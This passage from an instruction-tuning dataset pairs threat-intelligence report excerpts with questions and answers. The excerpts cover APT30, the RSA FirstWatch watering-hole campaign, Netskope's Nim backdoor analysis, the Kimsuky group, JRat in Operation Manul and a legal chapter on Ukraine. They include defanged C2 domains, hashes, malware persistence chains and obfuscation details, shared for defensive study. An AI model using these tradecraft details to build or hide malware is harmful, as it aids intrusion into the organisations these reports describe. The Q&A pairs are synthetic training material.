and domain registration data shows the group has been operating for over a decade. The earliest-known registration dates for domains attributed to APT30 go back to 2004, and the compile times for APT30 malware using those domains for C2 date back to 2005.1\nTypically, threat groups who register domains for malicious use will abandon them after a few years. APT30, however, has used some of their domains for more than five years, with some of their earliest domains still in use as of at least late 2014.\nFor example, one of the earliest known BACKSPACE malware samples (md5 hash b2138a57f723326eda5a26d2dec56851) was compiled onMarch 11, 2005 at 00:44:47. The sample used the domain www.km-nyc[.] com as its primary C2 location. That domain was still in use as a secondary C2 domain in a BACKSPACE sample compiled as recently as November 5, 2014  05:57:26 (md5 hash 38a61bbc26af6492fc1957ac9b05e435).\nFor such a long operational history, APT30 appears to have conducted their activity using a surprisingly limited number of tools and backdoors. One reason for this might be that they have had no need to diversify or add to their arsenal if they have been successful with their current approach. Although APT30 has used a variety of secondary or supporting tools over the years (such as droppers and downloaders used to deploy APT30's primary backdoors), their primary tools have remained remarkably consistent over time:  namely, the backdoors BACKSPACE and NETEAGLE, and a set of tools (SHIPSHAPE, SPACESHIP, and FLASHFLOOD) believed to be designed to infect (and steal data from) air-gapped networks via infected removable drives.\nWhere some threat groups might exchange one backdoor for another as newer, more flexible, or more feature-rich tools become available, APT30 has chosen to invest in the long-term refinement and development of what appear to be a dedicated set of tools.  This suggests that APT30 (or the developers providing them with tools) has the ability to modify and adapt their source code to suit their current needs or their target environment. The earliest variants of the BACKSPACE backdoor date to at least 2005, and versions of the backdoor remain in use today. BACKSPACE itself appears to have a flexible, modularized development framework and has been modified over time to create a wide range of variants.\nSmall Headline: APT30 appears to have a consistent, long-term mission that relies on existing tools to remain sufficient over time.\nFireEye has identified two main \"branches\" of the BACKSPACE code (\"ZJ\" and \"ZR\"), each compiled with a slightly different set of commands. In addition, while BACKSPACE has been implemented in a variety of ways (e.g., as a standalone EXE, as a DLL, as an EXE that extracts and launches a DLL at runtime) and leveraged a variety of persistence methods (e.g., via a shortcut (.lnk) file in the Startup folder, as a service DLL), the core functionality has remained largely unchanged, although some additional features have been added over time.\nWhile the NETEAGLE backdoor does not have as venerable a history (identified samples were compiled as early as 2008 and as recently as 2013), it shows a similar pattern of long-term refinement and modification, including the development of two main variants (which we call\nthe \"Scout\" and \"Norton\" variants). Just as with BACKSPACE, while the details of implementation and specific features across NETEAGLE samples may vary, the core functionality remains the same except for the addition of features or enhancements.\nThis dedication to adapting and modifying tools over a number of years, as opposed to discarding old tools in favor of newer, readily available ones, implies that APT30 has a long-term mission, and that their mission is consistent enough for their existing tools to be sufficient to support their operations over a long period of time.\n\nQ: How does the long-term use of consistent tools by APT30 indicate their operational strategy and effectiveness?",
    "output": "A: APT30's long-term use of consistent tools, such as the BACKSPACE and NETEAGLE backdoors, indicates a strategic focus on refining and adapting their existing arsenal rather than frequently switching to new tools. This approach suggests that their current tools have been effective enough to meet their operational goals without the need for significant changes. By investing in the long-term development and modification of these tools, APT30 demonstrates a commitment to a consistent, long-term mission that relies on the sufficiency of their existing capabilities over time.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Phase 1\nWe observed referral traffic begin on June 25, 2012 to the exploit site. However, according to the server logs, actual exploitation of Internet Explorer began on July 9, 2012 at approximately 7:56 AM EST when the first successful exploits of visiting browsers began to hit the exploit code. We observed some movement of exploit code across directories on the *******curling.com web server during the investigation, so this gap was likely caused by the attacker setting up a new campaign. Phase 1 exploit activity continued over the course of two days, with continuous access, until July 10th, when activity stopped at 3:43 pm EST.\nMedium Headline: Phase 2\nPhase 2, which consisted of the above mentioned attack on the Sun Java client, began on July 16, 2012, when the first successful exploits of visiting java clients began to hit the exploit server at approximately 7:46am EST. This exploit activity continued over the course of a few days, and ceased on July 18, 2012, at approximately 9:12 am EST, which was when the server administrator of *******curling.com brought the server down for compromise remediation.\nMedium Headline: Overall Statistics\nFigure 13: Success of Compromise\nFigure 14: Top Four Redirect Sites\nBased on our analysis, a total of 32,160 unique hosts, representing 731 unique global organizations, were redirected from compromised web servers injected with the redirect iframe to the exploit server. Of these redirects, 3,934 hosts were seen to download the exploit CAB and JAR files (indicating a successful exploit/compromise of the visiting host). This gives a \u2022success\u2022 statistic of 12%, which based on our previous understanding of exploit campaigns, indicates a very successful campaign.\nTotal Exposure and Compromise\nOf the listed sites used to redirect hosts to the exploit site, the top four redirecting web servers are as follows:\nWith success rates per exploit type being split pretty much down the middle:\nMedium Headline: Exploited Organization Breakdown\nOf the hosts above that downloaded the exploit CAB and JAR files, the RSA FirstWatch team further examined compromised organizations by identifying the visiting hosts and cross-referencing the IP addresses to the Autonomous Systems that they belonged to.\nCAVEAT: Because we didn\u2022t have observation of the compromised host themselves, nor command and control traffic, our understanding of \u2022compromise\u2022 is strictly-related to observed HTTP traffic. This analysis would not take into account host or perimeter-based blocking systems at affected organizations.\nWith this data we then grouped those autonomous systems into the following industries:\n\u2022 Corporate \u2022 These systems were identified as being members of typical corporate networks, which included enterprises and business, as well as \u2022business-class\u2022 IP space in large ISP organizations.\n\u2022 Defense Industrial Base (DIB) \u2022 These systems were systems in ASNs that were known to be involved with DIB consulting, systems and process.\n\u2022 Local Government \u2022 These systems were systems in networks identified as government systems in various cities, counties and towns.\n\u2022 Internet Service Provider (ISP) - These systems were hosts in networks that were identified as common internet service provider space. This particular classification accounts largely for consumer-based internet users, but may also include corporate assets that aren\u2022t immediately identifiable by ASN examination.\n\u2022 Federal Government \u2022 These systems are hosts in U.S. Government IP space or Washington DC area local government space. This would include Federal agencies and support organizations.\n\u2022 Educational Institutions (EDU) \u2022 These systems were hosts in networks identified as educational institutions. Much like ISP traffic, this traffic is difficult to breakdown into more specific identifying information.\n\u2022 Financial Services Organizations \u2022 These systems were systems in identifiable Bank, Credit Union, Trading and other organizations related to financial services.\n\u2022 Healthcare - These systems were hosts in identifiable healthcare industry space. This would include hospital, pharmaceutical, patient services and clinic space.\n\u2022 Other Government \u2022 These systems were national government systems identified in foreign IP space or global government organizations (example: United Nations)\n\u2022 Utilities / SCADA - These systems were hosts identified in organizations that supply or support utility or SCADA-related services such as Energy and water services.\nFigure 16: Compromises by Industry\nFigure 17: Compromise by Industry without ISP\nCompromises by Industry\nBy removing ISP traffic, we are better able to examine the other industries:\nBig Headline: Conclusions\nRSA FirstWatch research has revealed an exploit and compromise campaign with connections over the past 8 months. The collected data suggests that this attack was orchestrated and carried out by threat actors commonly referred to in the industry as \u2022APT\u2022:\n1) Use of the \u2022xKungFoo\u2022 script kit for victim redirection\n2) Use of attack methodology that matches motives seen in past APT attacks \u2022 most notably such as those seen in the Aurora and GhostNet campaigns\n3) Use of the \u2022gh0st\u2022 remote access tool (RAT) in this and previous campaigns\n4) Use of command and control infrastructure in the Hong Kong area in this and previous campaigns\n5) Gross impact and on almost 900 unique organizations\n6) Targets of Interest and Opportunity being geographically disperse in addition to industrial & vertical diverse with a heavy concentration in the following areas:\n\u2022 International finance & banking\n\u2022 Technology\n\u2022 Government \u2022 municipal, state, federal and international\n\u2022 Utilities & energy\n\u2022 Educational\n\u2022 Defense Industrial Base (DIB)\n\u2022 Corporate Enterprise\nThe possibility exists that this was intentional misdirection on the part of the attackers in regards to their origin. However, the RSA FirstWatch team believes the data supports our analysis and this is further evidence of APT intrusion into United States government and corporate assets.\nBig Headline: Disclaimer\nRSA Security LLC (\u2022RSA\u2022) believes the information in this publication is accurate as of its publication date. RSA disclaims any obligation to update after the date hereof. The information is subject to update without notice. The analysis may include technical or other inaccuracies and/or typographical errors.\nTHE INFORMATION IN THIS PUBLICATION IS PROVIDED TO FOR INFORMATIONAL PURPOSES ONLY, IS PROVIDED \"AS IS,\" AND SHALL NOT BE CONSIDERED PRODUCT DOCUMENTATION OR SPECIFICATIONS UNDER THE TERMS OF ANY LICENSE OR SIMILAR AGREEMENT. RSA MAKES NO REPRESENTATIONS OR WARRANTIES OF ANY KIND WITH RESPECT TO THE INFORMATION IN THIS PUBLICATION, AND SPECIFICALLY DISCLAIMS IMPLIED WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE.\ni http://www.wired.com/threatlevel/2010/01/operation-aurora/ ii http://www.scribd.com/doc/13731776/Tracking-GhostNet-Investigating-a-Cyber-Espionage-Network iii http://googleonlinesecurity.blogspot.com/2012/06/security-warnings-for-suspected-state.html iv http://contagiodump.blogspot.com/2011/02/targeted-attacks-against-personal.html v http://thediplomat.com/flashpoints-blog/2011/06/07/china-cyber-attack-fallacies/ vi http://www.yunsec.net/a/school/bdzs/fmuma/2010/0602/4175.html vii http://www.yunsec.net/a/school/bdzs/fmuma/2010/0602/4175.html viii http://www.zdnet.com/blog/security/state-sponsored-attackers-using-ie-zero-day-to-hijack-gmailaccounts/12462ix http://www.mcafee.com/us/resources/white-papers/foundstone/wp-know-your-digital-enemy.pdf x http://www.malwaredomainlist.com/mdl.php?search=wsdhealthy.com&colsearch=All&quantity=50 xi http://www.mywot.com/en/scorecard/wsdhealthy.com xii http://www.malwaregroup.com/domains/details/wsdhealthy.com\nABOUT RSA\nRSA, The Security Division of EMC, is the premier provider of security, risk and compliance management solutions for business acceleration. RSA helps the world\u2022s leading organizations succeed by solving their most complex and sensitive security challenges. These challenges include managing organizational risk, safeguarding mobile access and collaboration, proving compliance, and securing virtual and cloud environments.\nCombining business-critical controls in identity assurance, encryption & key management, SIEM, Data Loss Prevention and Fraud Protection with industry leading eGRC capabilities and robust consulting services, RSA brings visibility and trust to millions of user identities, the transactions that they perform and the data that is generated. For more information, please visit www.RSA.com and www.EMC.com.\nEMC2 , EMC, RSA, FirstWatch, NetWitness and the RSA logo are registered trademarks or trademarks of EMC Corporation in the United States and other countries. All other trademarks used herein are the property of their respective owners. \u00a92012 EMC Corporation. All rights reserved. Published in the USA.\nwww.emc.com/rsa\n\nQ: How did the RSA FirstWatch team determine the success rate of the exploit campaign, and what does this rate indicate about the effectiveness of the attack?",
    "output": "A: The RSA FirstWatch team determined the success rate of the exploit campaign by analyzing the number of unique hosts redirected to the exploit server and the number of hosts that downloaded the exploit CAB and JAR files. Out of 32,160 unique hosts, 3,934 were successfully compromised, resulting in a success rate of 12%. This rate indicates a very successful campaign based on previous understanding of exploit campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nIn this article, we describe the latest attack and the evolution of the tools in the campaigns against Armenian targets, as well as Azerbaijani activists and dissidents. All the details indicate that the underlying threat actors have been maintaining the development of Auto-IT based malware for the last seven years, and are using it in surveillance campaigns whose targets are consistent with Azerbaijani interests.\nCheck Point's (<https://www.checkpoint.com/infinity/zero-day-protection/>)Threat Prevention Engines provides comprehensive coverage of attack tactics, file-types, and operating systems and protects against attacks such as described in this research. is Check Point's rich cyber defense database. Its threat intelligence powers Check Point's zero-day protection solutions.\nCheck Point products provide the following coverage against this threat:\nAnti-Bot: Trojan.WIN32.OxtaRAT.A, Trojan.WIN32.OxtaRAT.B\nThreat Emulation: Trojan.WIN.OxtaRAT.A\nQuestion: How have the threat actors behind the Auto-IT based malware evolved their tools over the past seven years, and what specific indicators suggest that their targets align with Azerbaijani interests? Additionally, explain how Check Point's Threat Prevention Engines offer protection against these types of attacks.",
    "output": "Answer: The threat actors behind the Auto-IT based malware have been consistently developing and refining their tools over the past seven years. This evolution is evident in their ongoing use of Auto-IT based malware in surveillance campaigns targeting Armenian individuals, as well as Azerbaijani activists and dissidents. The alignment of their targets with Azerbaijani interests is indicated by the consistent focus on these specific groups. Check Point's Threat Prevention Engines provide comprehensive coverage against such threats by addressing various attack tactics, file-types, and operating systems. These engines are powered by Check Point's rich cyber defense database, which includes threat intelligence that enables zero-day protection solutions. Specifically, Check Point products offer coverage against this threat through Anti-Bot (Trojan.WIN32.OxtaRAT.A, Trojan.WIN32.OxtaRAT.B) and Threat Emulation (Trojan.WIN.OxtaRAT.A), ensuring robust protection against the described attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Delivery Method\nA malicious Word document was used to drop the Nim backdoor. The document was sent as an email attachment, where the sender claims to be a Nepali government official sending security arrangements. Despite the security controls placed around macros in Office files, we (<https://www.netskope.com/blog/netskope-threat-coverage-menorah>)are still seeing APT-attributed malware using them to drop their payload, like the malware we analyzed a couple of months ago.\nInitially opening the file will show a blank document with an instruction to enable macros. When the user clicks \"Enable Content,\" the auto-trigger routine (Document_Open) in the code will execute. Once the main function is called, the code is executed through additional VBA functions inside the document.\nMalicious Word file prior enabling macro\nBig Headline: Defense Evasion\nTo help bypass AV and static based detections, the VBA project is password protected and macros are obfuscated using the Chr( ) VBA function and string concatenation. The VBA code is split into the four subroutines in the image below.\nsch_task is a function that creates a VBscript named \"OCu3HBg7gyI9aUaB.vbs\" that will serve as the chain trigger. Initially, the VBscript is created in the AppData startup folder (C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs) and is set as a hidden file. Oddly, some variables are initialized in one function, but then utilized in a different function/s, which could be meant to confuse static analysis. Some strings referring to directories and libraries are split and then concatenated to evade static detection.\nVBA code for sch_task routine.\nhide_cons is a function to create another VBScript named \"skriven.vbs,\" which will be used by \"8lGghf8kIPIuu3cM.bat\" as a shell to run other scripts. More detailed info about this batch script is found below. Again, some strings referring to directories and libraries are split and then concatenated.\nVBA code for hide_cons routine.\nread_shell is a function that creates the payload named conhost.exe, which is inside a ZIP archive. As can be seen from the screenshot below of the macro code, it assembles the ZIP from an array of decimals (by converting each to byte) stored in the \"UserForm1\" object. The resulting byte array is the actual ZIP file and is dropped to  C:\\Users\\ <user>\\AppData\\Local\\Microsoft\\conhost.zip\nVBA code for read_shell routine.\nUserForm1 Containing Decimal/Bytes.\nvb_chainis a function mainly for creating \"8lGghf8kIPIuu3cM.bat\", which will be the stage of infection before the final payload. Exact file paths are generated by the VBA macro before writing to the batch file.\nvb_chain code snapshot.\nMedium Headline: Nim Backdoor\nThe Word document drops a malicious backdoor named \"conhost.exe\". The malware is written in Nim and was likely compiled on September 20, 2023.  is a statically typed compiled programming language. Its versatility shines through its ability to be compiled to C, C++, or JavaScript, coupled with a Pythonic syntax for a developer-friendly experience.\nThe backdoor runs within the same privilege as the current user logged in. It's looking to continue its ploy that the file was from a Nepali authority by imitating government domains for its C&C server ([.]govnp[.]org). When this backdoor is left undetected, users are at risk of having attackers gaining remote access.\nEven though the C2 servers are no longer accessible at the time of analysis, we were still able to extrapolate some of its behaviors, which can be seen below.\nBig Headline: Command and control through web protocol\nOnce the backdoor confirms there are no analysis tools running, it will spawn another command prompt instance to get the machine's hostname, then connect to its C&C server. It encrypts the hostname with a function named bakery. The encrypted hostname is encoded twice in base64, spliced behind a randomly chosen C&C server URL, and then concatenated with the \".asp\" suffix at the end to obtain the URL of the final command. The command delivered by the C&C server is obtained through an HTTP GET request.\nResponse data from GET contains the command from the C&C server. If the response data is different from the last time it was fetched, it means that the C&C server has issued a new command. Otherwise it will be dormant and keep requesting the command from the C&C server. Decryption of response data (command) is done by the confectionary function, then concatenated with cmd /c to execute the command. The execution result is also sent back to the server through a GET request. The key used for encryption and decryption is \"NPA\", which may be an abbreviation of NP (Nepal) Agent.\nScreenshot of network traffic specific to the sample.\nThe sample contacts the following C2 hosts:\nmail[.]mofa[.]govnp[.]org\nnitc[.]govnp[.]org\nmx1[.]nepal[.]govnp[.]org\ndns[.]govnp[.]org\nBig Headline: Persistence through Startup Folder and Scheduled Task\nTo retain access on the machine, a VBscript named \"OCu3HBg7gyI9aUaB.vbs\"  is placed in the startup folder. The script will initially confirm an internet connection using WMI's \"Win32_PingStatus\" class to ping https://www.google[.]com. If successful, it will run a batch file named \"8lGghf8kIPIuu3cM.bat\".\nThe main task of the batch file \"8lGghf8kIPIuu3cM.bat\" is to drop files that will further unpack and create a scheduled task for the payload. The batch file will create more scripts that will carry out these subtasks:\nunz.vbs is used for decompressing the executable out from the archive into the same directory\nunzFile.vbs creates unz.vbs\n2L7uuZQboJBhTERK.bat is just for chaining; runs unzFile.vbs then runs 2BYretPBD4iSQKYS.bat\n2BYretPBD4iSQKYS.bat is just for chaining; runs unz.vbs then runs d.bat\nd.bat creates a scheduled task of the unpacked payload (conhost.exe) then runs e.bat\ne.bat deletes itself and the other scripts created by 8lGghf8kIPIuu3cM.bat\nThe batch file named \"d.bat\" creates a scheduled task to attain another persistent execution of the malware on the target machine. The scheduled task is named\n\"ConsoleHostManager\" as seen in the below screenshot.\nScreenshot for Scheduled Task created.\nBig Headline: Conclusions\nMalware written in uncommon programming languages puts the security community at a disadvantage as researchers and reverse engineers' unfamiliarity can hamper their investigation. Nim is one of the young programming languages increasingly abused by malware authors. Aside from its familiar syntax, its cross-compilation features allow attackers to write one malware variant and have it cross-compiled to target different platforms. Netskope Threat Labs will continue monitoring the usage of unpopular programming languages.\n\nQ: How does the malicious Word document used in this campaign ensure that its macros are executed, and what steps are taken to evade antivirus and static-based detections?",
    "output": "A: The malicious Word document ensures that its macros are executed by displaying a blank document with instructions to enable macros. When the user clicks 'Enable Content,' the auto-trigger routine (Document_Open) in the code executes. To evade antivirus and static-based detections, the VBA project is password protected and macros are obfuscated using the Chr() VBA function and string concatenation. The VBA code is split into four subroutines: sch_task, hide_cons, read_shell, and vb_chain. These subroutines create various scripts and files, such as VBscripts and batch files, which are used to drop the payload and achieve persistence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3.3.1 Legal Analysis\nThe International Committee of the Red Cross (ICRC) has characterised the situation in eastern Ukraine as a 'non-international armed conflict',45 a situation in which hostilities occur between governmental armed forces and non-governmental organ-ised armed groups, or between such organised armed groups. The two requirements are a certain degree of organisation of the non-governmental groups and the existence of 'protracted armed violence'. 46 The conflict in Eastern Ukraine does in fact reach a high level of violence over a longer period of time, and the separatists do in fact have a high degree of organisation.\nAlthough Russia has consistently denied involvement, there continues to be widespread belief to the contrary, suggesting that Moscow actively supports the Donetsk and Luhansk separatists, including by sending Russian military forces as 'volunteers' to the area. If Russia actively participates or exercises 'overall control' over the separatists, the conflict could be considered an international armed conflict. To meet the criterion of 'overall control', a state must not only finance, train, equip, or provide operational support to local forces, but also have a role in organ-ising, coordinating, and planning their operations.47\nHowever, for the purpose of this chapter, the conflict in eastern Ukraine is considered to be a non-international armed conflict.\nThis analysis results in a situation where different legal regimes apply simultane-\n41 Aarti Shahani. 'Report: To Aid Combat, Russia Wages Cyberwar Against Ukraine', NPR, 28 April 2015, (<http://www.npr.org/sections/alltechconsidered/2015/04/28/402678116/report-to-aid-combat-russia-wages-cyberwar-against-ukraine>)http://www.npr.org/ (<http://www.npr.org/sections/alltechconsidered/2015/04/28/402678116/report-to-aid-combat-russia-wages-cyberwar-against-ukraine>)sections/alltechconsidered/2015/04/28/402678116/report-to-aid-combat-russia-wages-cyberwar-against-ukraine.\n42 Ellen Nakashima. 'Russian hackers use 'zero-day' to hack NATO, Ukraine in cyber-spy campaign', The Washington Post, 13 October 2014, (<http://www.washingtonpost.com/world/national-security/russian-hackers-use-zero-day-to-hack-nato-ukraine-in-cyber-spy-campaign/2014/10/13/f2452976-52f9-11e4-892e-602188e70e9c_story.html>)http://www.washingtonpost.com/world/national-security/russian-hackers-use-zero-day-to-hack-nato-ukrai-(<http://www.washingtonpost.com/world/national-security/russian-hackers-use-zero-day-to-hack-nato-ukraine-in-cyber-spy-campaign/2014/10/13/f2452976-52f9-11e4-892e-602188e70e9c_story.html>)ne-in-cyber-spy-campaign/2014/10/13/f2452976-52f9-11e4-892e-602188e70e9c_story.html.\n43 Michelle Martin and Erik Kirschbaum. 'Pro-Russian group claims cyber attack on German government websites', Reuters, 7 January 2015, (<http://www.reuters.com/article/2015/01/07/us-germany-cyberattack-idUSKBN0KG15320150107>)http://www.reuters.com/article/2015/01/07/us-germany-cyberattack-idUSKBN0KG15320150107.\n44 'The Daily Beast: Ukraine's lonely cyber warrior,' KyivPost, 18 February 2015, http://www.kyivpost.com/content/ukraine-ab-road/the-daily-beast-ukraines-lonely-cyber-warrior-381094.html, and Vitaly Shevchenko, 'Ukraine conflict: Hackers take sides in virtual war', BBC News, 20 December 2014, http://www.bbc.com/news/world-europe-30453069.\n45 'Fighting in eastern Ukraine continues to take its toll on civilians, and we urge all sides to comply with international humanitarian law, otherwise known as the law of armed conflict', said Mr Stillhart. 'These rules and principles apply to all parties to the non-international armed conflict in Ukraine, and impose restrictions on the means and methods of warfare that they may use [in Ukraine]': ICRC calls on all sides to respect international humanitarian law, ICRC News Release 14/125, 23 July 2014. Non-international armed conflicts are 'armed conflicts not of an international character occurring in the territory of one of the High Contracting Parties,' Geneva Conventions, Common Article 3.\n46 The criterion 'protracted armed violence' stems from Tadi\u0107, Decision on the Defence Motion for Interlocutory Appeal, para 70, International Criminal Tribunal for the Former Yugoslavia, 2 October 1995.\n47 'Overall control' is addressed in: Tadi\u0107, Appeals Chamber judgment, International Criminal Tribunal for the Former Yugoslavia, 15 July 1999, para 132, 137, 141, and 145. See also: Tallinn Manual, 79-82.\nously. The Law of Armed Conflict pursuant to international armed conflicts applies to the occupation of Crimea. Eastern Ukraine is a national issue in which the law pursuant to non-international armed conflicts applies. There is a crucial difference. During an international armed conflict, the Law of Armed Conflict applies to the full extent; during a non-international armed conflict, minimum rules apply.48 An example is that in an international armed conflict, combatants captured by the enemy are entitled to Prisoner of War (PoW) status. In a non-international armed conflict, the combatant's status is unknown; belligerents have to be treated well, but the extensive rules that protect PoWs do not apply. However, many rules of international armed conflict are customary law and apply also in a non-international armed conflict, as we will see with respect to cyber operations.\nSmall Headline: 4 Legal Implications for Cyber Operations in Ukraine\nThe conflict started as an internal matter, the protests at Maidan Square, to an unlawful intervention and occupation of Crimea, culminating in the non-international armed conflict in eastern Ukraine.\nDuring the first phase, the Euromaidan protests, the cyber incidents were a law enforcement issue. For example, the defacement of websites and DDoS attacks restricting the use of internet services violated Ukrainian criminal law and could have been prosecuted in Ukrainian courts.49 Malicious cross-border cyber activities, involving both Ukraine and other countries, would fall under the criminal jurisdiction of Ukraine and the affected countries.\nDuring the occupation of Crimea and the armed conflict in eastern Ukraine, the Law of Armed Conflict applies. It regulates the conduct of all actors in the conflict, including the cyber actors. Hereafter, During the Euromaidan first the status of the different cyber actors protests, cyber incidents were will be discussed; after that the cyber a law enforcement issue. operations we have seen in the Ukraine conflict will be evaluated from the perspective of the Law of Armed Conflict.\n\nAnswer this question based on the above context: How does the International Committee of the Red Cross (ICRC) characterize the situation in eastern Ukraine, and what are the key criteria for this classification?",
    "output": "The International Committee of the Red Cross (ICRC) characterizes the situation in eastern Ukraine as a 'non-international armed conflict.' This classification requires two key criteria: a certain degree of organization of the non-governmental groups and the existence of 'protracted armed violence.' The conflict in Eastern Ukraine meets these criteria due to the high level of violence over a prolonged period and the high degree of organization among the separatists.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Duke APT group's latest tools: cloud services and Linux support - F-Secure Weblog : News from the Lab\nRecent weeks have seen the outing of two new additions to the Duke group's toolset, SeaDuke and CloudDuke. Of these, SeaDuke is a simple trojan made interesting by the fact that it's written in Python. And even more curiously, SeaDuke, with its built-in support for both Windows and Linux, is the first cross-platform malware we have observed from the Duke group. While SeaDuke is a single - albeit cross-platform - trojan, CloudDuke appears to be an entire toolset of malware components, or \"solutions\" as the Duke group apparently calls them. These components include a unique loader, downloader, and not one but two different trojan components. CloudDuke also greatly expands on the Duke group's usage of cloud storage services, specifically Microsoft's OneDrive, as a channel for both command and control as well as the exfiltration of stolen data. Finally, some of the recent CloudDuke spear-phishing campaigns have born a striking resemblance to CozyDuke spear-phishing campaigns from a year ago.\nRead the text above and answer this question: How does the Duke APT group's use of cross-platform malware, such as SeaDuke, and cloud storage services, such as Microsoft's OneDrive, enhance their attack capabilities? Why might this be significant for cybersecurity experts to understand?",
    "output": "The Duke APT group's use of cross-platform malware like SeaDuke, which supports both Windows and Linux, enhances their attack capabilities by allowing them to target a wider range of systems. This is significant because it indicates a shift towards more versatile and adaptable malware that can infect multiple operating systems, making detection and mitigation more challenging. Additionally, their use of cloud storage services like Microsoft's OneDrive for command and control, as well as data exfiltration, provides a stealthy and efficient means of communication and data transfer. This method leverages legitimate services to blend in with normal traffic, making it harder for security measures to detect and block the malicious activities. Understanding these tactics helps cybersecurity experts to develop more robust defenses that can identify and respond to such sophisticated threats across different platforms and communication channels.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1. Overview\nThe Kimsuky threat group, deemed to be supported by North Korea, has been active since 2013. At first, they attacked North Korea-related research institutes in South Korea before attacking a South Korean energy corporation in 2014. Cases of attacks against countries other than South Korea have also been identified since 2017. (<https://atip.ahnlab.com/ti/contents/threat-actor/detail?tagSeq=15>)[1] The group usually employs spear phishing attacks against the national defense sector, defense industries, the press, the diplomatic sector, national organizations, and academic fields to steal internal information and technology from organizations. (<https://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?seq=31442>)[2] (This link is only available in Korean.)\nEven until recently, the Kimsuky group was still mainly employing spear phishing attacks to gain initial access. What makes the recent attacks different from the previous cases is that more LNK shortcut-type malware are being used instead of malware in Hangul Word Processor (HWP) or MS Office document format. The threat actor led users to download a compressed file through attachments or download links within spear phishing emails. When this compressed file is decompressed, it yields a legitimate document file along with a malicious LNK file.\nASEC is monitoring the Kimsuky group's attacks using LNK-type malware and is continuously posting identified cases of attacks on the ASEC Blog. The Kimsuky group installs remote control malware to control the infected system after completing such steps to\ngain initial access. Malware used by the Kimsuky group not only include custom-made such as AppleSeed and PebbleDash (<https://asec.ahnlab.com/en/30532/>)[3], but also open-source or commercial malware such as XRat (<https://asec.ahnlab.com/en/31089/>)[4], HVNC (<https://asec.ahnlab.com/en/27346/>)[5], Amadey (<https://asec.ahnlab.com/en/40483/>)[6], and Metasploit Meterpreter (<https://asec.ahnlab.com/en/53046/>)[7]. After gaining control, the threat actor ultimately uses RDP or installs Google's Chrome Remote Desktop (<https://asec.ahnlab.com/en/55145/>)[8] to exfiltrate information from the infected system.\nHere we analyze Amadey and RftRAT which were recently found being distributed. Amadey and RftRAT were constantly used throughout 2023 alongside XRat. However, recent types showed that they were created with AutoIt. This post also covers Infostealers additionally installed by the Kimsuky group using remote control malware. While remote control-type malware continuously change, the malware installed through these have not changed much in the attacks in 2023.\n\nBased on the above text, answer a question. Why did the Kimsuky threat group shift from using HWP or MS Office document format malware to LNK shortcut-type malware in their recent spear phishing attacks? How does this change affect the initial access strategy of the group?",
    "output": "The Kimsuky group shifted to using LNK shortcut-type malware instead of HWP or MS Office document format malware to gain initial access. This change involves leading users to download a compressed file through attachments or download links within spear phishing emails. When decompressed, the file contains a legitimate document file along with a malicious LNK file. This strategy allows the threat actor to exploit user trust in legitimate documents while delivering the malicious payload more effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Victims of Operation Manul\nSome victims of Operation Manul have expressed a desire to preserve their anonymity, which we respect. The victims we are at liberty to identify include Alexander Petrushov and Irina Petroshova, publishers of the independent Kazakh newspaper, Respublika, Peter Sahlas, a human rights attorney, several members of Mukhtar Ablyazov's family, Astolfo\nDi Amato, an Italian attorney who spearheaded anti-corruption litigation involving allegations of corruption by Kazakhstan, and dissident theater director Bolat Atabayev. Several victims allege that they have been physically followed, had their homes broken into, and been tracked using GPS devices. Mr. Di Amato alleges that his law firm's website has been the victim of several DDoS attacks, which he believes are linked to his litigation involving the government of Kazakhstan.\nMedium Headline: JRat Malware Family\nOne of the common malware samples used over the course of Operation Manul is known as JRat or Jacksbot. JRat is a commercially available remote access tool (RAT), written in Java. JRat is currently available for purchase at jrat[.]io for the price of $40 USD.4 JRat has been continuously developed for the last four years, seemingly by a single developer who goes by the name \"redp0ison\". While JRat itself is closed source, many modules and helpful utilities are open source and are available on github.5\nSmall Headline: JRat Functionality\nFig 3. JRat Controller on Windows\n4 Payable only in bitcoin.\n5 https://github.com/java-rat\nJRat is a cross platform RAT, able to target hosts running Windows, OSX, Linux, BSD, and even Solaris. The RAT is highly modular\u2014it even has an open API so that the attacker may write custom modules to fit their needs. JRat modules include the following functionality: keylogging, reverse proxy, password recovery, turning on the host webcam, disabling webcam indicator light, listing host processes, opening a shell on the host, editing the host registry, and even chatting with the remote host. JRat also provides a controller application, which is written in Java. This controller application allows the attacker to manage all of their JRat instances and view uptime, operating system, and other information about all infected hosts. JRat also provides a web version of the controller, which is open source.6\nFig 4. JRat Controller viewing host screen\nFig 5. JRat Controller screen for an infected host\n6 https://github.com/java-rat/web\nSmall Headline: Anti-Analysis\nJRat contains a number of interesting features to thwart analysis by a malware researcher.\nFig. 6 An example of the ZKM obfuscated JRat code.\nThe code itself is obfuscated using Zendix Klass Master (ZKM),7 a commercially-available Java obfuscator. ZKM obfuscates the code by giving it generic class, method, and variable\nnames, it also encodes the strings by xoring them with a series of random bytes, and includes extraneous code-paths. All of this is done to make the java bytecode harder to decompile and analyze for the reverse engineer.\n7 http://www.zelix.com/klassmaster/featuresZKMScript.html\nThe JRat JAR file contains an encrypted config file named config.dat. The JRat config file is encrypted using AES in CBC mode. The encryption key and IV are cleverly hidden in the \"extra\" field for the zipped config.dat file. As illustrated in the example below (Fig. 7), the extra field begins at offset 0x30 of the file header for a given file in the compressed JAR. Within the 32 byte extra field, the first 16 bytes are the AES decryption key, and the last 16 bytes store the IV.\nFig. 7 An example file header in a compressed Zip or JAR file.\nOnce it is decrypted, we are able to extract the plaintext configuration information including the domain of the command and control server and port number (Fig 8). JRat also employs anti-virtualization features to detect and shut down if it is being run in VirtualBox, VMware, or other virtualization software.\nJRat is low cost, versatile, extensible, and feature rich. Given these facts and the diversity of 